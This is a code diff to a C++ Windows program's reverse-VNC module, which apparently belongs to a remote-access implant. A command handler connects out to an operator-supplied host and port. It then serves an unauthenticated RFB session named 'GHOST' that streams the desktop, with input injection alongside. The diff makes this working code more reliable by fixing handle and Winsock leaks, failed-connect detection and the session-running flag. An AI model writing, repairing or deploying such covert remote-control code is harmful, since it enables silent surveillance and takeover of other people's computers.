@@ -93,6 +93,11 @@ struct Grab {
         if (prev) VirtualFree(prev, 0, MEM_RELEASE);
         hdcMem = nullptr; hbmp = nullptr; prev = nullptr; bits = nullptr;
     }
+    // Free() guards every member and nulls them out, so it is idempotent and
+    // safe on a partially-initialised Grab. Releasing on scope exit fixes the
+    // paths where Init() bailed after taking the screen DC but before the
+    // bitmap, which used to leak the DC once per failed session.
+    ~Grab() { Free(); }
 };
 
 // ── input injection ──────────────────────────────────────────────────────────
@@ -296,21 +301,19 @@ static bool ServeClient(SOCKET s, Grab& g) {
 // ── serve thread ─────────────────────────────────────────────────────────────
 struct VncCtx { SOCKET s; };
 
-static DWORD WINAPI VncServeThread(LPVOID p) {
-    auto* ctx   = static_cast<VncCtx*>(p);
-    SOCKET s    = ctx->s;
-    delete ctx;
-
+// Runs one RFB session on an already-connected socket. Teardown lives in
+// VncServeThread so it happens exactly once per session; here we only return.
+static DWORD VncServe(SOCKET s) {
     Grab g;
-    if (!g.Init()) { closesocket(s); InterlockedExchange(&g_vncRunning, 0); return 1; }
+    if (!g.Init()) return 1;
 
     // RFB 3.3 handshake: server picks None auth, no SecurityResult message.
-    if (!SendAll(s, "RFB 003.003\n", 12)) { g.Free(); closesocket(s); InterlockedExchange(&g_vncRunning, 0); return 1; }
+    if (!SendAll(s, "RFB 003.003\n", 12)) return 1;
     uint8_t ver[12];
-    if (!RecvAll(s, ver, 12))              { g.Free(); closesocket(s); InterlockedExchange(&g_vncRunning, 0); return 1; }
-    if (!SendU32BE(s, 1))                  { g.Free(); closesocket(s); InterlockedExchange(&g_vncRunning, 0); return 1; }  // None
+    if (!RecvAll(s, ver, 12))              return 1;
+    if (!SendU32BE(s, 1))                  return 1;  // None
     uint8_t share = 0;
-    if (!RecvAll(s, &share, 1))            { g.Free(); closesocket(s); InterlockedExchange(&g_vncRunning, 0); return 1; }
+    if (!RecvAll(s, &share, 1))            return 1;
 
     // ServerInit
     bool ok = SendU16BE(s, static_cast<uint16_t>(g.w)) && SendU16BE(s, static_cast<uint16_t>(g.h));
@@ -320,18 +323,28 @@ static DWORD WINAPI VncServeThread(LPVOID p) {
                              0, 0, 0 };              // padding
     ok = ok && SendAll(s, pf, 16);
     ok = ok && SendU32BE(s, 5) && SendAll(s, "GHOST", 5);
-    if (!ok) { g.Free(); closesocket(s); InterlockedExchange(&g_vncRunning, 0); return 1; }
+    if (!ok) return 1;
 
     // Prime the diff buffer so the first incremental request gets a full frame.
     g.Snap();
     memcpy(g.prev, g.bits, g.frameBytes);
 
     ServeClient(s, g);
-
-    g.Free();
-    closesocket(s);
-    InterlockedExchange(&g_vncRunning, 0);
     return 0;
+}
+
+static DWORD WINAPI VncServeThread(LPVOID p) {
+    auto* ctx = static_cast<VncCtx*>(p);
+    SOCKET s  = ctx->s;
+    delete ctx;
+
+    DWORD rc = VncServe(s);
+    closesocket(s);
+    // Balance the WSAStartup that HandleVnc did for this session; without it
+    // every streaming run left the Winsock refcount one higher.
+    WSACleanup();
+    InterlockedExchange(&g_vncRunning, 0);
+    return rc;
 }
 
 // ── public entry ─────────────────────────────────────────────────────────────
@@ -391,20 +404,41 @@ std::wstring HandleVnc(const std::string& args) {
     connect(s, res->ai_addr, (int)res->ai_addrlen);
     fd_set wset; FD_ZERO(&wset); FD_SET(s, &wset);
     timeval tv = { 5, 0 };
-    bool connected = select(0, nullptr, &wset, nullptr, &tv) > 0;
+    int sel = select(0, nullptr, &wset, nullptr, &tv);
+
+    // Writability alone proves nothing: Winsock also marks the socket writable
+    // when a non-blocking connect *fails*, so the old check reported "streaming"
+    // for an endpoint that had already refused us. The real verdict is SO_ERROR.
+    int soErr = 0;
+    if (sel == 1) {
+        int len = sizeof(soErr);
+        getsockopt(s, SOL_SOCKET, SO_ERROR, reinterpret_cast<char*>(&soErr), &len);
+    } else if (sel == 0) {
+        soErr = WSAETIMEDOUT;
+    } else {
+        soErr = WSAGetLastError();
+        if (soErr == 0) soErr = WSASYSTEMFAILURE;
+    }
+
     nb = 0;
     ioctlsocket(s, FIONBIO, &nb);
     freeaddrinfo(res);
 
-    if (!connected) {
+    if (soErr != 0) {
         closesocket(s); WSACleanup();
-        return L"[error: connect to " + UTF8ToWString(host) + L":" + UTF8ToWString(port) + L" failed]";
+        return L"[error: connect to " + UTF8ToWString(host) + L":" + UTF8ToWString(port)
+             + L" failed (WSA " + std::to_wstring(soErr) + L")]";
     }
 
+    // Claim the session slot before the thread exists. VncServeThread only ever
+    // clears this flag, so VncRunning() was permanently false and the
+    // "already streaming" guard above could never fire.
+    InterlockedExchange(&g_vncRunning, 1);
     auto* ctx  = new VncCtx{ s };
     HANDLE hTh = CreateThread(nullptr, 0, VncServeThread, ctx, 0, nullptr);
     if (!hTh) {
-        closesocket(s); delete ctx; WSACleanup();
+        delete ctx;
+        closesocket(s); WSACleanup();
         InterlockedExchange(&g_vncRunning, 0);
         return L"[error: thread failed]";
     }
